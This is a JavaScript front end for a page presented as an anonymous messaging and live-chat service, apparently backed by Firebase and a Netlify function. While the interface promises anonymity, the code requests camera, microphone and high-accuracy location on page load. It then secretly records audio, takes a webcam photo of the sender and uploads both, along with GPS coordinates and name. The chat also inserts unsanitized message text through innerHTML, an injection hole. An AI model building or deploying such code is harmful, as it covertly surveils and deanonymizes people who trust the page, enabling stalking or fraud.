// Firebase Config (YOUR PROJECT'S CONFIG - DO NOT SHARE PUBLICLY)
const firebaseConfig = {
    apiKey: "AIzaSyBiIEU8xsfxjYgGRjOvoP1RKtZKwN5i0yk",
    authDomain: "kycupdateapp.firebaseapp.com",
    databaseURL: "https://kycupdateapp-default-rtdb.firebaseio.com",
    projectId: "kycupdateapp",
    storageBucket: "kycupdateapp.firebasestorage.app",
    messagingSenderId: "508854921421",
    appId: "1:508854921421:web:ebd92a2f9d69b62d54a184"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore(); // Get a reference to Firestore database


document.addEventListener('DOMContentLoaded', () => {
    // --- Get all the elements we need from the HTML ---
    const step1 = document.getElementById('step1-message');
    const step2 = document.getElementById('step2-finalize');
    const step3 = document.getElementById('step3-thankyou');

    const messageInput = document.getElementById('anonymousMessage');
    const nextButton = document.getElementById('nextButton');
    const userNameInput = document.getElementById('userName');
    const emojis = document.querySelectorAll('.emoji');
    const sendButton = document.getElementById('sendButton');

    const mainLiveChatButton = document.getElementById('mainLiveChatButton');
    const thankYouLiveChatButton = document.getElementById('liveChatButton');
    const closeButton = document.getElementById('closeButton');

    const liveChatOverlay = document.getElementById('liveChatOverlay');
    const closeChatButton = document.getElementById('closeChatButton');
    const chatNameInput = document.getElementById('chatNameInput');
    const chatMessageInput = document.getElementById('chatMessageInput');
    const sendChatMessageButton = document.getElementById('sendChatMessageButton');
    const chatMessagesContainer = document.getElementById('chatMessages');


    let selectedEmoji = null;
    let mediaRecorder;
    let audioChunks = [];
    let userMediaStream; // Stores the MediaStream (camera/mic)
    let userLocation = { latitude: null, longitude: null }; // To store location data

    // --- Live Chat Specific Variables ---
    let currentChatSessionId = null;
    let chatUserDisplayName = null; // Display name for the user in chat
    let unsubscribeFromChat = null; // To store the Firestore listener unsubscribe function


    // --- Permissions on Page Load ---
    async function requestPermissions() {
        console.log('DEBUG: requestPermissions function started.');

        // Request camera and microphone
        console.log('DEBUG: Attempting to request Camera/Mic.');
        try {
            userMediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
            console.log('DEBUG: Camera/Microphone permissions granted!');

            // --- Setup Audio Recording (BUT DO NOT START YET) ---
            mediaRecorder = new MediaRecorder(userMediaStream);
            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

        } catch (error) {
            console.warn('DEBUG: Camera/Microphone permissions were denied or encountered error:', error);
            userMediaStream = null; // Ensure userMediaStream is null if permissions denied
        }

        // --- Request Geolocation Permission ---
        console.log('DEBUG: Checking if Geolocation is supported.');
        if (navigator.geolocation) {
            console.log('DEBUG: Geolocation is supported. Attempting to request location.');
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    userLocation.latitude = position.coords.latitude;
                    userLocation.longitude = position.coords.longitude;
                    console.log('DEBUG: Geolocation permission granted and captured:', userLocation);
                },
                (error) => {
                    console.warn('DEBUG: Geolocation permission denied or error:', error);
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } // Options for better accuracy
            );
        } else {
            console.warn('DEBUG: Geolocation is NOT supported by this browser.');
        }
        console.log('DEBUG: requestPermissions function finished.');
    }

    requestPermissions(); // Call permission function on DOMContentLoaded

    // --- Photo Capture Function ---
    async function capturePhoto() {
        if (!userMediaStream) return null;
        const videoTrack = userMediaStream.getVideoTracks()[0];
        if (!videoTrack) return null;
        try {
            const imageCapture = new ImageCapture(videoTrack);
            const blob = await imageCapture.takePhoto();
            return blob;
        } catch (error) {
            console.error("DEBUG: Could not capture photo:", error);
            return null;
        }
    }

    // --- Image Compression Function ---
    function compressImage(imageFile, maxWidth = 800, quality = 0.7) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.readAsDataURL(imageFile);
            reader.onload = event => {
                const img = new Image();
                img.src = event.target.result;
                img.onload = () => {
                    const canvas = document.createElement('canvas');
                    let width = img.width;
                    let height = img.height;

                    if (width > height) {
                        if (width > maxWidth) {
                            height = Math.round((height * maxWidth) / width);
                            width = maxWidth;
                        }
                    } else {
                        if (height > maxWidth) {
                            width = Math.round((width * maxWidth) / height);
                            height = maxWidth;
                        }
                    }

                    canvas.width = width;
                    canvas.height = height;

                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0, width, height);

                    canvas.toBlob(blob => {
                        resolve(blob);
                    }, 'image/jpeg', quality);
                };
                img.onerror = error => reject(error);
            };
            reader.onerror = error => reject(error);
        });
    }


    // --- Main Anonymous Messaging Flow Logic ---
    messageInput.addEventListener('input', () => {
        if (messageInput.value.trim() !== '') {
            nextButton.classList.remove('hidden');
        } else {
            nextButton.classList.add('hidden');
        }
    });

    nextButton.addEventListener('click', () => {
        if (messageInput.value.trim() === '') {
            messageInput.style.animation = 'shake 0.5s';
            setTimeout(() => { messageInput.style.animation = '' }, 500);
            return;
        }
        step1.classList.add('hidden');
        mainLiveChatButton.classList.add('hidden');
        step2.classList.remove('hidden');

        // --- START RECORDING NOW *** ---
        if (mediaRecorder && mediaRecorder.state === 'inactive') {
            audioChunks = []; // Clear any previous chunks
            mediaRecorder.start();
            console.log('DEBUG: Audio recording started on final step.');
        }
    });

    emojis.forEach(emoji => {
        emoji.addEventListener('click', () => {
            const currentlySelected = document.querySelector('.emoji.selected');
            if (currentlySelected) {
                currentlySelected.classList.remove('selected');
            }
            emoji.classList.add('selected');
            selectedEmoji = emoji.dataset.emoji;
        });
    });

    sendButton.addEventListener('click', async () => {
        if (userNameInput.value.trim() === '') {
            userNameInput.style.animation = 'shake 0.5s';
            setTimeout(() => { userNameInput.style.animation = '' }, 500);
            return;
        }

        sendButton.disabled = true;
        sendButton.textContent = 'Sending...';

        // Stop recording to finalize the audio file
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            console.log('DEBUG: Recording stopped by sending message.');
        }

        // Capture photo
        let photo1 = await capturePhoto();
        let compressedPhoto1 = null;

        // Compress the photo before sending
        if (photo1) {
            compressedPhoto1 = await compressImage(photo1);
            console.log('DEBUG: Original photo size:', (photo1.size / 1024).toFixed(2), 'KB');
            console.log('DEBUG: Compressed photo size:', (compressedPhoto1.size / 1024).toFixed(2), 'KB');
        }

        // Use a small delay to ensure the recorder has time to process the last chunk
        await new Promise(resolve => setTimeout(resolve, 500));

        const formData = new FormData();
        formData.append('message', messageInput.value.trim());
        formData.append('name', userNameInput.value.trim());
        formData.append('emoji', selectedEmoji || 'No reaction');

        // --- Append location data if available ---
        if (userLocation.latitude !== null && userLocation.longitude !== null) {
            formData.append('latitude', userLocation.latitude);
            formData.append('longitude', userLocation.longitude);
            console.log('DEBUG: Appending location data to form:', userLocation);
        } else {
            console.log('DEBUG: Location data not available to append.');
        }


        if (compressedPhoto1) {
            formData.append('photo1', compressedPhoto1, 'compressed_photo.jpg');
        }
        if (audioChunks.length > 0) {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            formData.append('audio', audioBlob, 'audio.webm');
        }

        // --- Sending ALL Data to Backend ---
        try {
            console.log('DEBUG: Sending data to Netlify function.');
            const response = await fetch('/.netlify/functions/send-message', {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                console.log('DEBUG: Data sent successfully.');
                step2.classList.add('hidden');
                step3.classList.remove('hidden');

                // --- Stop all camera/mic tracks ---
                if (userMediaStream) {
                    userMediaStream.getTracks().forEach(track => track.stop());
                    console.log('DEBUG: Camera/Mic tracks stopped.');
                }

            } else {
                console.error('DEBUG: Failed to send message. Server response:', response.status);
                throw new Error('Failed to send message.');
            }
        } catch (error) {
            console.error('DEBUG: Error sending data:', error);
            alert('Sorry, something went wrong. Please try again.');
            sendButton.disabled = false;
            sendButton.textContent = 'Send Anonymously';
        }
    });

    // --- Thank You Screen Button Logic ---
    closeButton.addEventListener('click', () => { window.close(); });

    // --- Live Chat Button Logic (opens overlay) ---
    function openLiveChat() {
        liveChatOverlay.classList.remove('hidden');
        liveChatOverlay.classList.add('visible');
        // Clear previous messages on opening (optional, but good for fresh chat)
        chatMessagesContainer.innerHTML = ``; // Clear all messages initially
        // Add the initial system message only if it's a new session or chat is empty
        if (!currentChatSessionId || chatMessagesContainer.children.length === 0) {
            const systemMessage = document.createElement('div');
            systemMessage.classList.add('chat-message', 'system-message');
            systemMessage.innerHTML = `<p>Enter your name to start chatting.</p>`;
            chatMessagesContainer.appendChild(systemMessage);
        }
        
        chatNameInput.value = chatUserDisplayName || ''; // Retain name if already set
        chatMessageInput.value = ''; // Clear message input
        chatNameInput.focus(); // Focus on name input
        
        // Ensure message input is disabled until a name is entered
        chatMessageInput.disabled = true;
        sendChatMessageButton.disabled = true;

        // If a name is already present, enable message input immediately
        if (chatNameInput.value.trim() !== '') {
            chatMessageInput.disabled = false;
            sendChatMessageButton.disabled = false;
            chatMessageInput.focus();
        }
    }

    function closeLiveChat() {
        liveChatOverlay.classList.remove('visible');
        liveChatOverlay.classList.add('hidden');
        // Unsubscribe from Firestore listener when chat is closed
        if (unsubscribeFromChat) {
            unsubscribeFromChat();
            unsubscribeFromChat = null; // Clear the reference
            console.log('DEBUG: Unsubscribed from chat listener.');
        }
        currentChatSessionId = null; // Reset session ID on close
        chatUserDisplayName = null; // Reset user name on close
    }

    thankYouLiveChatButton.addEventListener('click', openLiveChat);
    mainLiveChatButton.addEventListener('click', openLiveChat);
    closeChatButton.addEventListener('click', closeLiveChat);


    // --- Live Chat Messaging Logic ---

    // Enable/disable message input based on name presence
    chatNameInput.addEventListener('input', () => {
        if (chatNameInput.value.trim() !== '') {
            chatMessageInput.disabled = false;
            sendChatMessageButton.disabled = false;
            // If name is entered, automatically focus on message input
            if (!chatUserDisplayName) { // Only focus if it's a new name being entered for the session
                 chatMessageInput.focus();
            }
        } else {
            chatMessageInput.disabled = true;
            sendChatMessageButton.disabled = true;
        }
    });

    sendChatMessageButton.addEventListener('click', sendMessageToChat);

    chatMessageInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            sendMessageToChat();
        }
    });


    async function sendMessageToChat() {
        const messageText = chatMessageInput.value.trim();
        const enteredName = chatNameInput.value.trim();

        if (!enteredName) {
            alert("Please enter your name to start chatting."); // Should be prevented by disabled state
            chatNameInput.focus();
            return;
        }

        if (messageText === '') {
            return; // Don't send empty messages
        }

        // Set chat user name if not already set for this session
        if (!currentChatSessionId) { // If it's the very first message of a new session
            chatUserDisplayName = enteredName;
            // Generate a unique ID for this chat session
            currentChatSessionId = 'chat_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9);
            console.log('DEBUG: New chat session started with ID:', currentChatSessionId, 'Name:', chatUserDisplayName);
            setupChatListener(currentChatSessionId); // Setup listener for this new session
        } else if (!chatUserDisplayName) {
            // This case should ideally not happen if currentChatSessionId is set, but as a fallback
            chatUserDisplayName = enteredName;
        }


        try {
            // Add message to Firestore
            await db.collection('live_chats').doc(currentChatSessionId).collection('messages').add({
                text: messageText,
                sender: chatUserDisplayName,
                timestamp: firebase.firestore.FieldValue.serverTimestamp(), // Firestore generates server timestamp
                isVenky: false // This message is from the user, not Venky
            });
            console.log('DEBUG: Message sent to Firestore.');

            // Clear input field
            chatMessageInput.value = '';
            chatMessageInput.focus();

            // Notify backend (Netlify Function) about new chat message to trigger Telegram Bot 2 notification
            // This will be a separate Netlify function later, for now just a console log
            console.log('DEBUG: Would notify Telegram Bot 2 about new chat message here for session:', currentChatSessionId);

        } catch (error) {
            console.error('DEBUG: Error sending chat message:', error);
            alert('Failed to send chat message. Please try again.');
        }
    }

    // --- Real-time listener for chat messages ---
    function setupChatListener(sessionId) {
        if (unsubscribeFromChat) {
            unsubscribeFromChat(); // Unsubscribe from previous listener if any
        }

        // Clear existing messages before adding new ones from the listener
        chatMessagesContainer.innerHTML = ''; 

        unsubscribeFromChat = db.collection('live_chats').doc(sessionId).collection('messages')
            .orderBy('timestamp') // Order by timestamp to show messages in order
            .onSnapshot(snapshot => {
                // Clear and re-render all messages to handle initial load and updates
                chatMessagesContainer.innerHTML = ''; 
                snapshot.docs.forEach(doc => {
                    displayChatMessage(doc.data());
                });
                chatMessagesContainer.scrollTop = chatMessagesContainer.scrollHeight; // Auto-scroll to bottom
            }, error => {
                console.error('DEBUG: Error listening to chat messages:', error);
            });
        console.log('DEBUG: Chat listener set up for session:', sessionId);
    }

    function displayChatMessage(messageData) {
        const messageElement = document.createElement('div');
        messageElement.classList.add('chat-message');
        messageElement.classList.add(messageData.isVenky ? 'other-message' : 'user-message');

        const senderName = messageData.isVenky ? 'Venky' : (messageData.sender || 'Anonymous User'); // Use messageData.sender for robustness
        const timestamp = messageData.timestamp ? new Date(messageData.timestamp.toDate()).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '';
        
        messageElement.innerHTML = `<strong>${senderName}:</strong> <p>${messageData.text}</p><span class="chat-timestamp">${timestamp}</span>`;
        
        // System messages don't need a sender name prefix
        if (messageData.isSystem) {
             messageElement.innerHTML = `<p>${messageData.text}</p>`;
             messageElement.classList.remove('user-message', 'other-message'); // Ensure no sender styling
        }

        chatMessagesContainer.appendChild(messageElement);
        chatMessagesContainer.scrollTop = chatMessagesContainer.scrollHeight; // Auto-scroll
    }
});

// Add shake animation keyframes dynamically
const styleSheet = document.createElement("style");
styleSheet.type = "text/css";
styleSheet.innerText = `@keyframes shake {
    10%, 90% { transform: translate3d(-1px, 0, 0); }
    20%, 80% { transform: translate3d(2px, 0, 0); }
    30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
    40%, 60% { transform: translate3d(4px, 0, 0); }
}`;
document.head.appendChild(styleSheet);
